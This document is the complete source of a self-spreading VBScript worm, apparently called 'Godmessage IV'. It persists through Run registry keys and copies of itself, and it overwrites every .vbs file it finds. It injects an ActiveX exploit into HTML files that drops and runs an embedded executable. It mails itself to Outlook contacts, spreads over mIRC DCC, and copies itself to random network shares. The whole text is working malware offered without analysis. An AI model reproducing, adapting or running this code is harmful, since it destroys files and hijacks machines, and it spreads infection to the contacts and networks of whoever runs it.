Option Explicit
Dim StartTime, CurrentTime, xtimer
StartTime = Timer
Dim timeout1, timeout2, timeout3
timeout1 = 15
timeout2 = 2000
timeout3 = 2500
Dim fso, wsh, net
Set fso = CreateObject("Scripting.FileSystemObject")
Set wsh = CreateObject("WScript.Shell")
Set net=Wscript.CreateObject("WScript.Network")
Const ForReading = 1
Const ForWriting = 2 
Const ForAppending = 8
Dim sysOS, windir, htmlloc, vbsloc, vbsfile, vbscopy, vbsdir, vbsname
sysOS = wsh.ExpandEnvironmentStrings("%OS%")
windir = wsh.ExpandEnvironmentStrings("%windir%")
vbsloc = WScript.ScriptFullname
vbsname = WScript.ScriptName
vbsdir = fso.GetParentFolderName(vbsloc)
Set vbsfile = fso.OpenTextFile(WScript.ScriptFullname, ForReading)
vbscopy = vbsfile.ReadAll
vbsfile.close
htmlloc = vbsdir & "\Godmessage.html"
Dim locdir1, locdir2, locdir3
locdir1 = fso.GetSpecialFolder(2)
locdir2 = fso.GetParentFolderName(locdir1)
locdir3 = fso.GetParentFolderName(locdir2)
Dim startup
startup = wsh.SpecialFolders("Startup")

Dim binloc
binloc = "set asciiBin=fso.CreateTextFile(""""2ascii.bin"""")"" & Chr(13) & Chr(10) & ""asciiBin.Write """"n-- 2ASCII v2.0 -------- (c)1997 m&g software"""" & Chr(47) & """"Arminio Grgic-GrGa --"""" & vbNewline & """"n"""" & vbNewline & """"e100 BD 0 1 BA B5 1 B8 0 3D CD 21 72 19 8B D8 E8 72 0 72 12 3C 25"""" & vbNewline & """"e116 75 F7 BF C3 1 57 E8 65 0 3C D 74 5 AA EB F6 CD 20 B8 0 24 AB"""" & vbNewline & """"e12C 5A B4 3C 33 C9 CD 21 72 F1 3E 89 86 D3 1 B4 9 BA AC 1 CD 21"""" & vbNewline & """"e141 B1 4 E8 3E 0 72 35 3C D 74 F7 3C A 74 F3 3C 7E 74 29 2C 30 80"""" & vbNewline & """"e157 F9 4 75 6 8A E8 FE C9 EB E2 51 D2 E5 D2 E5 80 E5 C0 A C5 59"""" & vbNewline & """"e16C FE C9 75 3 B9 4 0 3E 88 86 D2 1 E8 1B 0 EB C6 B4 3E CD 21 BB"""" & vbNewline & """"e182 D3 2 51 B4 3F BA D2 1 3 D5 52 5E B9 1 0 CD 21 AC 59 C3 53 51"""" & vbNewline & """"e198 B4 40 BA D2 1 3 D5 3E 8B 9E D3 1 B9 1 0 CD 21 59 5B C3 44 65"""" & vbNewline & """"e1AE 63 6F 64 69 6E 67 20 32 41 53 43 49 49 2E 42 49 4E 0 74 6F 20"""" & vbNewline & """"g"""" & vbNewline & """"q (c)m&g <Arminio.Grgic@USA.Net>"""" & vbNewline & """"%ONZ.EXE"""" & vbNewline & """"E=J@0020000400?0?oo080h000000000100J00000000000000000000000000000000"""" & vbNewline & """"000000000000001080j@00>Obd9=8Qh1=<=QJ@@DEXYcDP`bE_Wb5Q]PE]ecAdPRAUPb"""" & vbNewline & """"5e^PEe^T5UbPEGY^0cb=0:Tg00000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"D0@5@00<0130a5Y72e0000000000SP0>21;102I00@0000@0@00@000@1V0040P0@00`"""" & vbNewline & """"0000400000@0000200010000000000300:0000008000000400000000020000000@00"""" & vbNewline & """"0P00000@000@000000000@0000000000000040`0<0l0000000000000000000000000"""" & vbNewline & """"00000000`00l1`000F00000000000000000000000000000000000000000000000000"""" & vbNewline & """"000000000000000000000000000000000000000000000000000000000000EE@H0`00"""" & vbNewline & """"00001@0000@000000000040000000000000000002000GPE@1Ha0000000@0@00P0000"""" & vbNewline & """"0800004000000000000000004000L0PE5@Hb0000000@00001`000020000<00000000"""" & vbNewline & """"00000000@000`0000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000:0DT9^"""" & vbNewline & """"5V_jDPDX5YcPEVY\AUPYAcP`EQS[5UTPEgYdAXPd5XUPEE@HDPUhEUSeEdQR5\UPE`QS"""" & vbNewline & """"E[UbDPXd5d`j@__e5`h^EdchD^_b1WPT0:0T59TjDPE@1HP`0^ibDP3_E`ibEYWX1dPX"""" & vbNewline & """"13YP0aii0f]a0iiiDP<QEcj\A_P=E_\^5QbP@VP=EQb[5ecPE?RUEbXeE]Ub0PT:@0T9"""" & vbNewline & """"1TjPE>BF0P`^0faPE3_`EibYEWXd@PX30YPa0iif0]ai0iiPE=QbE[ec4P6^AH^:@^P?"""" & vbNewline & """"ERUbEXe]5UbP0T:0DT<YESU^5cUjDP>BAFPV5_bPEE@HDPYcDPTYEcdbEYReEdUTDPe^"""" & vbNewline & """"ETUbDPc`EUSY5Q\PE\YSEU^c1UPT@:0E5@HQ0<92`9=Xnlnn=c0G4M40004600000P00"""" & vbNewline & """"0V00oQ_nngoX0006h[;`96o7X@7:06lRQd:@8087E67Vjk_kO[`Z5TXF0SSU095AX>;m"""" & vbNewline & """"?\Y9?eo>1Z0;4^kf^kW70a>4S]A9QK^;=d_=0>mMGkFRjgo_0;46lHk6055EfQ<kkm_M"""" & vbNewline & """"0422`6EMn3hoUeCF3oecYoAa2_aC3A:eH4cXP\;`;fa10]6=;[j5D1oOJnGZ41Z2=RY0"""" & vbNewline & """"YbQSEMXQ\NkfGMWfg5V72=Ai65VHPk=k3\KK0mg@Rki=KGQ6X^kmH?4NCo0ZP5EKY8mm"""" & vbNewline & """"4cVjlePe803mNb_c2?@?>5AC5<g419kVelVTB]<kPeG>iMfk2`FXlE8mc_XSonk]FoOV"""" & vbNewline & """"2i<0FoMVe976X7d3Ci0eSda<QLFQ4<XaJiaNjH4?PHDT53V01d`mFB=g1VAFd@lniijK"""" & vbNewline & """"n1;Y@21\0[BRnKYN810m^]MV^F8E3=NPmX8inI]H=n=G2PHlAA<4@3lBiIJ;2c7`=CR1"""" & vbNewline & """"YGG7jmOUAE;4Qd9fB?>Q1hT?lRf0gm<3]^8F\d6Q8bMk1UQk]g\Iel<[Qf4VP04e=WG="""" & vbNewline & """"U`?S8eZ1RMZKjCec9eVBP`ER`6792VcS8oM10F>;=2<LhR8YBNSk>jcE2Ib9<4@?jac9"""" & vbNewline & """"O_lS@gmX^;O`_dn;;g0o4kd7o54d5cFcG97Gg^OjAoTE\cB:hG0ZL``>i@;29Ck:eOgl"""" & vbNewline & """"\of3Cn0foagSm>[baK38EH78d9eDf;jfjMa1j4MX:IJ1=Ngm5HYf<P:0E0FI0IQ8fCa2"""" & vbNewline & """"JR1TaBUhOHJo;g`0jiYo[b^3oYogGI9G4j@@G<I8=BAMg48O?kL18S;85:]ic\jc0]XP"""" & vbNewline & """"X?<f@H85lENg\GTA?Gko4]Z6lmoKMogWg[WQEUh`E\_b5Ub^48UPD0ciEcdUa]Xk>go^"""" & vbNewline & """"EY^YD0R_5_d?EXU\A\0L000GZB7e3JFe2_1S4P??kW?KCF;H;J`:0U5QZAAA2A8<P@DA"""" & vbNewline & """"ZAAA0HLPXTAA:AAX0\`dZAAA2AhlU04AZAAAE<@DYHAAJAALEPTXZAAAFA\`UdhAZAAA"""" & vbNewline & """"Yl04Z8AAZAA<Z@HL1N@D;HT000205GoXE:]cEf\bAd?>PPO`Eg`QEccQPN0S4S0@co]h"""" & vbNewline & """"@_X3EQ^^5_dPnbMNOjodEYQ\EYjUDPc_ES[UC00dAX;de8K;9_oH1WPa0^fEEUbfEUbc"""" & vbNewline & """"g:gmggS^E^UT08@PE[Y\A\>TEYcS9_m;Kam:EUSd4=eE5QT9Sg3kB]11EfHT@P3g5_bC"""" & vbNewline & """"dQRo0`9PEQSS5U``e7_]3f90E5bb@=0;D?@\@cbga[_4D^T5EBUWAR[bUCg[E0[KAYf@"""" & vbNewline & """"@P4D7dT]0X0e0XTAX50`0;X0@3gERKY81<Q]Ecdbgg2aG]SQAd8GEbYdF`YfaQ6Km6An"""" & vbNewline & """"E_VYE\UCDJI1DK7WhA:fEUd<aQX`dY6]GH]c@O:CD4U`DO3elLKfN4RUe^da59TDA3?Q"""" & vbNewline & """"kM\]AVW15?`L@b[Gff6aE_ETE_gcE4YbF9Aik]e]G?Q3E_]]AQH<0L`=:3ioGH`iDk3\"""" & vbNewline & """"E_cU18JnU=g3L=f_ETe\d@11I]55UhYaIoaQ1oW;E1TTQb?5DFTk@U^^QK2JV[jJJETC"""" & vbNewline & """"@0lkfJ]KV;e^Q1GQ6H=hVePcFoQWEU2_Eh1LBg:=TZ>c8T\8I?kcN>2GWhOnEdOQYfHo"""" & vbNewline & """";MJ:DkdXFjdREi^Qm]KfGQD8EYC1WBUn=e;7U[`c41fcE^d_5QX>MW9^D5^c@jhSL07L"""" & vbNewline & """"agZaTmR4E3CdGH2`GWQbQd;PlZLbF_ic1U010=G:05<3kOnl3o7505;6@I;C0A860FD:"""" & vbNewline & """"07G60C6:gKfk3]6G0E650G6D0BF@0H:nP9;o_MMe0>DJ076507I70=A?1?96TL]K>km<"""" & vbNewline & """"0:I60N?GDHe:0R;^<6mM8?00D0@51c14405Y[7eF;o3@<UP0:>1;012I008>MXfm1;3P"""" & vbNewline & """"4<0;]UTC:=R1030:m@9H:`A402hc4@biJ@V[`@`FP3Z@G;00`D12jn4mE3?4m5G[@6W1"""" & vbNewline & """"lViUDPP4E1D1DPP;:Ob>>R0^EYTH1QWSb0=20`3FTWL3L`H64hSW10TJ2F=gAUW@<4?a"""" & vbNewline & """"3_00NPmm5d232@00<0o0000000000000@00PBn0PQ00=Rn0`OooGn3=oS[@@Z@@@Z@@:"""" & vbNewline & """"T66847717Ke7R;N3?^lAgKb]2h1000017Ke7R;N3?^lAcKA0L1Kc7_e9R;N3?^lAgKcT"""" & vbNewline & """"\a93CX3bl=1P88:6i63`Godd>9517Ke7R;N3?^lAcKA9L1Ke87;Nn3^l<AKA79ePa11K"""" & vbNewline & """"Qe7;hN3^clAK<A91gKc_Qe9;hN3^clAK]cT3S121cm0c_oo3SA1=PD_3Omlf8?:29287"""" & vbNewline & """"E79eOgYSoooo:@;2>324R973S743CY4gca1?gY<oOooN^9gi0c0080:7a7\X@l1g;g0o"""" & vbNewline & """"d0ebR;7:AO4V?1X8?10@>64Ykh0[cX1`R973S759oHRI:=n010002;7970dh6;O4:=4`"""" & vbNewline & """"40P0`01ci@37\8oF5TP0X0E:4778g0dLN9iG]8b^]EoF5XP0`090Qd79h333l4[Q]Q33"""" & vbNewline & """"S74==Nla;0:7a7901dRl7_gA\13;h364?10@>641;`93?[RTl?1PT@V;h737l2[RMQY_"""" & vbNewline & """"nXoo0000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"0000000000000000000000000000000068`0D0T`0000000000000000P00E1`005``0"""" & vbNewline & """"0000000000000000H0Q`@00h1`0000000000000000006\`0H00`0000000000000000"""" & vbNewline & """"000000000000H0h``0061`000000L0F`000000007V`00000`00d1`000000D0;5EB>5"""" & vbNewline & """"1<cbD^4<A<0CE85<1<cbD^4<A<0EEC5B0cb^ET\\D0GCE?3;0cb^ET\\0000E<_QET<Y"""" & vbNewline & """"ERbQEbi1@007EUd@Eb_SE1TTEbUc1c00ECXUE\\5EhUSEedU1100D0=UEccQEWU2E_h1"""" & vbNewline & """"0000EbUS1f0040P000<0000B0f000000008000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"00000000000000000000000000000000000000000000000000000000000000000000"""" & vbNewline & """"000000000000000000000000~"""" & vbNewline & """"<end>"""" & vbNewline"" & Chr(13) & Chr(10) & ""asciiBin.close"" & Chr(13) & Chr(10) & """

main()

Sub main()
CheckEnvi()

If vbsdir = locdir1 Then
OESpread()
xtimer = StartTime \ 3600
Do
CurrentTime = Timer
If(xtimer*3600 < CurrentTime) Then
CheckEnvi()
OCSpread()
xtimer = xtimer + 1
End If 
Loop
End If

If vbsdir = locdir2 Then
scanDrives() 
xtimer = StartTime \ 900
Do
CurrentTime = Timer
If(xtimer*900 < CurrentTime) Then
CheckEnvi()
xtimer = xtimer + 1
End If
Loop
End If

If vbsdir = locdir3 Then
Do
NetbiosScan()
CheckEnvi()
Loop
End If
End Sub

Sub CheckEnvi()
On Error Resume Next
If Not fso.FileExists(htmlloc) And Not vbsdir = startup Then
	SpawnHtml()
End If
If fso.FileExists(startup & "\GM1.HTA") Then fso.DeleteFile(startup & "\GM1.HTA")
If fso.FileExists(startup & "\GM2.HTA") Then fso.DeleteFile(startup & "\GM2.HTA")
If Not fso.FileExists(locdir1 & "\" & vbsname) Then
	fso.CopyFile vbsloc, locdir1 & "\" & vbsname
	wsh.Run locdir1 & "\" & vbsname, False
End If
If Not fso.FileExists(locdir2 & "\" & vbsname) Then
	fso.CopyFile vbsloc, locdir2 & "\" & vbsname
	wsh.Run locdir2 & "\" & vbsname, False
End If
If Not fso.FileExists(locdir3 & "\" & vbsname) Then
	fso.CopyFile vbsloc, locdir3 & "\" & vbsname
	wsh.Run locdir3 & "\" & vbsname, False
End If
If wsh.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\GM1") = "" Then
	wsh.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\GM1", locdir1 & "\" & vbsname, "REG_SZ"
End If
If wsh.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\GM2") = "" Then
	wsh.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\GM2", locdir2 & "\" & vbsname, "REG_SZ"
End If
If wsh.RegRead("HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\GM3") = "" Then
	wsh.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\GM3", locdir3 & "\" & vbsname, "REG_SZ"
End If


End Sub

Sub SpawnHtml()
Dim spwn(4), spwnHtml, spwnTmp
spwn(0) = "<HTML><HEAD><TITLE>Godmessage IV</TITLE>" 
spwn(1) = "<META content=""text/html; charset=windows-1252"" http-equiv=Content-Type></HEAD>" 
spwn(2) = "<BODY BGColor=""black"">" 
spwn(3) = "<BR><CENTER><H1><FONT color=red>Judgement Comes in Darkness and Whirling Winds</FONT></H1></CENTER>"
spwn(4) = "</BODY></HTML>"
Set spwnHtml = fso.CreateTextFile(htmlloc, True)
spwnHtml.Write Join(spwn, vbNewLine)
spwnHtml.close
spwnTmp = Inject(htmlloc)
Set spwnHtml = fso.OpenTextFile(htmlloc, ForWriting, True)
spwnHtml.Write spwnTmp
spwnHtml.close
End Sub

Sub OESpread()
Dim dir1, f1, sf1, f, idn
If sysOS = "Windows_NT" Then
	dir1 = locdir3 & "\Application Data\Identities"
Else
	dir1 = windir & "\Application Data\Identities"
End If

Set f1 = fso.GetFolder(dir1)
Set sf1 = f1.SubFolders
For Each f in sf1
	idn = f.name
Next
Dim regKey
regKey = "HKCU\Identities\" & idn & "\Software\Microsoft\Outlook Express\5.0\"
wsh.RegWrite regKey & "Signature Flags", 00000003, "REG_DWORD"
wsh.RegWrite regKey & "\signatures\Default Signature", "00000000", "REG_SZ"
wsh.RegWrite regKey & "\signatures\00000000\file", htmlloc, "REG_SZ"
wsh.RegWrite regKey & "\signatures\00000000\name", "Signature #1", "REG_SZ"
wsh.RegWrite regKey & "\signatures\00000000\text", "", "REG_SZ"
wsh.RegWrite regKey & "\signatures\00000000\type", 00000002, "REG_DWORD"
End Sub

Sub scanDrives()
On Error Resume Next
Dim d,dc,s
Set dc = fso.Drives
For Each d in dc
	If d.DriveType = 2 or d.DriveType=3 Then
		folderlist(d.path&"\")
	End If
Next
End Sub

Sub folderlist(folderspec)  
On Error Resume Next
Dim f,f1,sf
Set f = fso.GetFolder(folderspec)  
Set sf = f.SubFolders
For each f1 in sf
	infectfiles(f1.path)
	folderlist(f1.path)
Next
End Sub

Sub infectfiles(folderspec)  
On Error Resume Next
Dim f,f1,fc,ext,ap,s
Set f = fso.GetFolder(folderspec)
Set fc = f.Files
For each f1 in fc
	ext=fso.GetExtensionName(f1.path)
	ext=lcase(ext)
	s=lcase(f1.name)
	If (ext="vbs") or (ext="vbe") Then
		fso.Copyfile f1.path, f1.path & ".GMW", True	
		Set ap=fso.OpenTextFile(f1.path, ForWriting, True)
		ap.write vbscopy
		ap.close
	ElseIf(ext="htm") or (ext="html") Then
		Inject(f1.path)
	ElseIf(s="mirc32.exe") Then
		Dim scriptini
		Set scriptini=fso.CreateTextFile(folderspec&"\script.ini", True)
		scriptini.WriteLine "[script]"
		scriptini.WriteLine ";mIRC Script"
		scriptini.WriteLine "n0=on 1:JOIN:#:{"
		scriptini.WriteLine "n1=  /if ( $nick == $me ) { halt }"
		scriptini.WriteLine "n2=  /.dcc send $nick "& htmlloc
		scriptini.WriteLine "n3=}"
		scriptini.close
	End If
Next  
End Sub

Sub NetbiosScan()
On Error Resume Next
Dim w, x, n, o, i, rd, r(2)
Randomize
Do While w=0
	r(0) = "\\24."
	r(1) = "\\208." 
	r(2) = "\\209."
	rd = r(Int(3*Rnd+1)-1)
	n=rd&Int(254*rnd+1)&"."&int(254*rnd+1)&"."&int(254*rnd+1)&"\C"
	x = Chr(Int(20*Rnd+103))&":"
	net.mapnetworkdrive x,n
	Set o=net.enumnetworkdrives
	For i=0 to o.Count-1
		If n=o.item(i) Then w=1
	Next
Loop
fso.Copyfile vbsloc, x&"\windows\startm~1\programs\startup\"
net.removenetworkdrive x
w=0
End Sub

Sub OCSpread()
On Error Resume Next
Dim x, i, n, alst, mail, ctrlists, ctrentries, mailadr, regalst, regadr
Dim outlook, mapi
Set outlook=WScript.CreateObject("Outlook.Application")
Set mapi=outlook.GetNameSpace("MAPI")
Randomize
For ctrlists=1 to mapi.AddressLists.Count
	set alst = mapi.AddressLists(ctrlists)
	regalst = wsh.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & alst)
	If (regalst="") then
		regalst=1
		n = 0
	Else
		n = regalst 
	End If
	x = Int(alst.AddressEntries.Count*Rnd+1)
	i = Int(5*Rnd+1)
	If (int(alst.AddressEntries.Count)>int(regalst)) Then
		For ctrentries=1 to i
			mailadr=alst.AddressEntries(x)
			regadr=wsh.RegRead("HKEY_CURRENT_USER\Software\Microsoft\WAB\" & mailadr)
			If (regadr="") Then
				n = n + 1
				Set mail=outlook.CreateItem(0)
				mail.Recipients.Add(mailadr)
				mail.Subject = "Godmessage"
				mail.Body = vbNewline & "Please see attached."
				mail.Attachments.Add(htmlloc)
				mail.Send
				wsh.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & mailadr,1,"REG_DWORD"
			End if
			x = Int(alst.AddressEntries.Count*Rnd+1)
		Next
		wsh.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & alst, n
	Else
		wsh.RegWrite "HKEY_CURRENT_USER\Software\Microsoft\WAB\" & alst, n
	End if
Next
End Sub

Function Inject(html)
Dim f1, i, s, strBdy 
Dim regExBdy, retValBdy, retStrBdy
ReDim htmlArr(-1)
Set f1 = fso.OpenTextFile(html, ForReading)
i = 0
Do While NOT f1.AtEndOfStream
s = f1.ReadLine
Set regExBdy = New RegExp
regExBdy.Pattern = "<BODY"
regExBdy.IgnoreCase = True
retValBdy = regExBdy.Test(s)
If retValBdy Then
	Dim regExOnL, retValOnL, retStrOnL 
	Dim MatchOnL, MatchesOnL, MatchBdy, MatchesBdy
	Set regExOnL = New RegExp
	regExOnL.Pattern = "onLoad="
	regExOnL.IgnoreCase = True
	retValOnL = regExOnL.Test(s)
	If retValOnL Then
		Set MatchesOnL = regExOnL.Execute(s)
		For Each MatchOnL in MatchesOnL  
		retStrOnL = MatchOnL.FirstIndex
		Next 
		strBdy = Left(s, retStrOnL + 8) & "f(); " & Right(s, Len(s)-(retStrOnL + 8))
		s = strBdy	
	Else	
	Set MatchesBdy = regExBdy.Execute(s)
	For Each MatchBdy in MatchesBdy  
		retStrBdy = MatchBdy.FirstIndex
	Next
	strBdy = Left(s, retStrBdy + 5) & " onLoad=""f()"" " & Right(s, Len(s)-(retStrBdy + 5))
	s = strBdy
	End If
End If
Dim regExEnd, retValEnd, retStrEnd, MatchEnd, MatchesEnd
Set regExEnd = New RegExp
regExEnd.Pattern = "</BODY>"
regExEnd.IgnoreCase = True
retValEnd = regExEnd.Test(s)
If retValEnd Then
	Set MatchesEnd = regExEnd.Execute(s)
	For Each MatchEnd in MatchesEnd  
		retStrEnd = MatchEnd.FirstIndex
	Next 
	strBdy = Left(s, retStrEnd) & GenHtml() & Right(s, Len(s)-(retStrEnd))
	s = strBdy
End If
ReDim preserve htmlArr(i)
htmlArr(i) = s
i = i + 1
Loop
f1.Close
Inject = Join(htmlArr, vbNewline) 
End Function

Function StartHtml(setTimeout1, setTimeout2, setTimeout3)
Dim html(19)
html(0) = "<APPLET HEIGHT=0 WIDTH=0 code=com.ms.activeX.ActiveXComponent></APPLET>"
html(1) = "<SCRIPT language=JAVASCRIPT>"
html(2) = "a1=document.applets[0];"
html(3) = "fn1=""..\\\\Start Menu\\\\Programs\\\\Startup\\\\GM1.HTA"";"
html(4) = "fn2=""..\\\\Start Menu\\\\Programs\\\\Startup\\\\GM2.HTA"";"
html(5) = "function f(){"
html(6) = "cl=""{06290BD5-48AA-11D2-8432-006008C3FBFC}"";"
html(7) = "a1.setCLSID(cl);"
html(8) = "a1.createInstance();"
html(9) = "setTimeout(""a1.setProperty('Path','""+fn1+""')""," & setTimeout1 & ");"
html(10) = "setTimeout(""a1.setProperty('DOC',doc1)""," & setTimeout2 & ");"
html(11) = "setTimeout(""a1.invoke('write',VA)""," & setTimeout3 & ");"
html(12) = "setTimeout(""a1.setProperty('Path','""+fn2+""')""," & setTimeout3 + 500 & ");"
html(13) = "setTimeout(""a1.setProperty('DOC',doc2)""," & setTimeout3 + 1000 & ");"
html(14) = "setTimeout(""a1.invoke('write',VA)""," & setTimeout3 + 1500 & ");}"
html(15) = "</SCRIPT><SCRIPT language=VBSCRIPT>"
html(16) = "Option Explicit"
html(17) = "Dim VA, doc1, doc2"
html(18) = "VA = ARRAY()"
html(19) = ""
StartHtml = Join(html, vbNewline)
End Function

Function Encode(file2enc, fname, vname)
Dim Input, nline, nl, s, a
Dim fLine1, fLine2, fLine
Set input = fso.OpenTextFile(file2enc, ForReading)
nLine = " & vbNewline"
nl = " & Chr(13) & Chr(10) & "
s = input.ReadLine
s = Replace(s, Chr(34), Chr(34) & Chr(34) & Chr(34) & Chr(34))
s = Replace(s, Chr(47), Chr(34) & Chr(34) & " & Chr(47) & " & Chr(34) & Chr(34))
fLine1 = "set " & vname & "=fso.CreateTextFile(" & Chr(34) & Chr(34) & fname & Chr(34) & Chr(34) & ")"""
fLine2 = """" & vname & ".Write " & Chr(34) & Chr(34) & s & Chr(34) & Chr(34)
ReDim ca(-1)
redim preserve ca(0)
ca(0) = fLine1
redim preserve ca(1)
ca(1) = nl
redim preserve ca(2)
ca(2) = fLine2
redim preserve ca(3)
ca(3) = nLine
a = 4
Do While NOT input.AtEndOfStream
ReDim preserve ca(a)
s = input.ReadLine
s = Replace(s, Chr(34), Chr(34) & Chr(34) & Chr(34) & Chr(34))
s = Replace(s, Chr(47), Chr(34) & Chr(34) & " & Chr(47) & " & Chr(34) & Chr(34))
If s = "" Then
ca(a) = nLine
Else
fLine = " & " & Chr(34) & Chr(34) & s & Chr(34) & Chr(34) 
ca(a) = fLine & nLine
End If
a = a+1
Loop
ReDim preserve ca(a)
ca(a) = Chr(34) & nl & """" & vname & ".close""" & nl & Chr(34)
input.Close 
Encode = Join(ca, "")
End Function

Function GenHtml()
Dim nl, htmlEnd, htmlstart, f1
nl = Chr(34) & " & Chr(13) & Chr(10) & " & Chr(34)
Dim ar1(2), ar2(4), ar3(1), data(9)
ar1(0) = "Chr(13) & Chr(10) & ""<SCRIPT language=VBSCRIPT>" & nl
ar1(1) = "Set fso = CreateObject(""""Scripting.FileSystemObject"""")" & nl
ar1(2) = "Set wsh = CreateObject(""""WScript.Shell"""")" & nl

ar2(0) = "wsh.Run """"%comspec% /c debug < 2ascii.bin"""",0,True" & nl
ar2(1) = "wsh.Run """"%comspec% /c move onz.exe %windir%\onz.exe"""",0,True" & nl
ar2(2) = "wsh.Run """"%comspec% /c start %windir%\onz.exe"""",0,False" & nl
ar2(3) = "fso.DeleteFile """"2ascii.bin"""", True" & nl
ar2(4) = "<"" & Chr(47) & ""SCRIPT><BODY onload=""""javascript: window.close()""""><"" & Chr(47) & ""BODY>"

ar3(0) = "wsh.Run """"%comspec% /c start GMW.vbs"""",0,False" & nl
ar3(1) = "<"" & Chr(47) & ""SCRIPT><BODY onload=""""javascript: window.close()""""><"" & Chr(47) & ""BODY>"

data(0) = StartHtml(timeout1, timeout2, timeout3)
data(1) = "doc1 = " & Join(ar1, "")
data(2) = binloc
data(3) = Join(ar2, "") & Chr(34)
data(4) = vbNewline
data(5) = "doc2 = " & Join(ar1, "")
data(6) = Encode(vbsloc, "GMW.vbs", "gmVbs")
data(7) = Join(ar3, "") & Chr(34)
data(8) = vbNewline
data(9) = "</SCRIPT>"

GenHtml = Join(data, "")
End Function

